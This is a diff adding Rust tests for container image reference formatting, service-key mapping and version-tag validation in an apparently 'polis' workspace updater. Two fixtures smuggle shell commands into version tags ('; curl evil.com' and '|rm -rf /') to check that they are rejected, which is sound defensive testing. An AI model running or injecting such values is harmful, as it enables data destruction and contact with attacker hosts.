@@ -1363,5 +1363,164 @@ mod tests {
             let tag = format!("v0.3.0-rc{meta}1");
             prop_assert!(validate_version_tag(&tag).is_err(), "tag with {meta:?} should be invalid");
         }
+
+        // -----------------------------------------------------------------------
+        // ghcr_ref — property
+        // -----------------------------------------------------------------------
+
+        /// `ghcr_ref` output always starts with the GHCR prefix.
+        #[test]
+        fn prop_ghcr_ref_always_starts_with_prefix(
+            image in "[a-z][a-z0-9-]{1,30}",
+            version in "v[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}",
+        ) {
+            let r = ghcr_ref(&image, &version);
+            prop_assert!(r.starts_with(GHCR_PREFIX), "ref {r:?} must start with GHCR_PREFIX");
+        }
+
+        /// `ghcr_ref` output always ends with `:{version}`.
+        #[test]
+        fn prop_ghcr_ref_always_ends_with_version(
+            image in "[a-z][a-z0-9-]{1,30}",
+            version in "v[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}",
+        ) {
+            let r = ghcr_ref(&image, &version);
+            prop_assert!(r.ends_with(&format!(":{version}")), "ref {r:?} must end with :{version}");
+        }
+
+        // -----------------------------------------------------------------------
+        // container_to_service_key — property
+        // -----------------------------------------------------------------------
+
+        /// `polis-{x}-oss` always maps to `{x}`.
+        #[test]
+        fn prop_container_to_service_key_polis_x_oss_maps_to_x(
+            middle in "[a-z][a-z0-9]{1,20}",
+        ) {
+            let name = format!("polis-{middle}-oss");
+            let key = container_to_service_key(&name);
+            prop_assert_eq!(key, middle.as_str());
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // ghcr_ref — unit
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_ghcr_ref_formats_correctly() {
+        assert_eq!(
+            ghcr_ref("polis-gate-oss", "v0.3.1"),
+            "ghcr.io/odralabshq/polis-gate-oss:v0.3.1"
+        );
+    }
+
+    #[test]
+    fn test_ghcr_ref_empty_version_still_formats() {
+        let r = ghcr_ref("polis-gate-oss", "");
+        assert!(r.ends_with(':'), "empty version should produce trailing colon");
+    }
+
+    // -----------------------------------------------------------------------
+    // container_to_service_key — unit
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_container_to_service_key_strips_polis_prefix_and_oss_suffix() {
+        assert_eq!(container_to_service_key("polis-gate-oss"), "gate");
+    }
+
+    #[test]
+    fn test_container_to_service_key_all_known_services() {
+        let cases = [
+            ("polis-gate-oss", "gate"),
+            ("polis-sentinel-oss", "sentinel"),
+            ("polis-resolver-oss", "resolver"),
+            ("polis-scanner-oss", "scanner"),
+            ("polis-workspace-oss", "workspace"),
+            ("polis-state-oss", "state"),
+            ("polis-toolbox-oss", "toolbox"),
+        ];
+        for (input, expected) in cases {
+            assert_eq!(
+                container_to_service_key(input),
+                expected,
+                "input: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_container_to_service_key_no_prefix_returns_original() {
+        assert_eq!(container_to_service_key("gate"), "gate");
+    }
+
+    #[test]
+    fn test_container_to_service_key_only_prefix_no_oss_suffix_returns_original() {
+        // "polis-gate" has the prefix but not the "-oss" suffix → fallback
+        assert_eq!(container_to_service_key("polis-gate"), "polis-gate");
+    }
+
+    // -----------------------------------------------------------------------
+    // compute_container_updates — unit
+    // -----------------------------------------------------------------------
+
+    fn manifest_with_containers(containers: &[(&str, &str)]) -> VersionsManifest {
+        VersionsManifest {
+            manifest_version: 1,
+            vm_image: VmImageVersion {
+                version: "v0.3.0".to_string(),
+                asset: "polis-workspace-v0.3.0-amd64.qcow2".to_string(),
+            },
+            containers: containers
+                .iter()
+                .map(|(k, v)| (k.to_string(), v.to_string()))
+                .collect(),
+        }
+    }
+
+    #[test]
+    fn test_compute_container_updates_invalid_tag_returns_error() {
+        // V-004: invalid version tag must be rejected before any multipass call
+        let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.1; curl evil.com")]);
+        let result = compute_container_updates(&manifest);
+        assert!(result.is_err(), "invalid tag must return error");
+        assert!(
+            result.unwrap_err().to_string().contains("invalid version tag"),
+            "error must mention invalid version tag"
+        );
+    }
+
+    #[test]
+    fn test_compute_container_updates_injection_tag_returns_error() {
+        // V-004: shell metacharacter in tag
+        let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.0|rm -rf /")]);
+        assert!(compute_container_updates(&manifest).is_err());
+    }
+
+    #[test]
+    fn test_compute_container_updates_no_v_prefix_returns_error() {
+        let manifest = manifest_with_containers(&[("polis-gate-oss", "0.3.0")]);
+        assert!(compute_container_updates(&manifest).is_err());
+    }
+
+    // -----------------------------------------------------------------------
+    // update_containers — unit (VM not running path)
+    // -----------------------------------------------------------------------
+
+    #[test]
+    fn test_update_containers_vm_not_running_returns_error() {
+        // In the test environment multipass is not installed → is_vm_running() returns false.
+        let manifest = manifest_with_containers(&[("polis-gate-oss", "v0.3.1")]);
+        let ctx = crate::output::OutputContext::new(true, true);
+        let result = update_containers(&manifest, &ctx);
+        assert!(result.is_err());
+        assert!(
+            result
+                .unwrap_err()
+                .to_string()
+                .contains("Workspace is not running"),
+            "error must mention workspace not running"
+        );
     }
 }
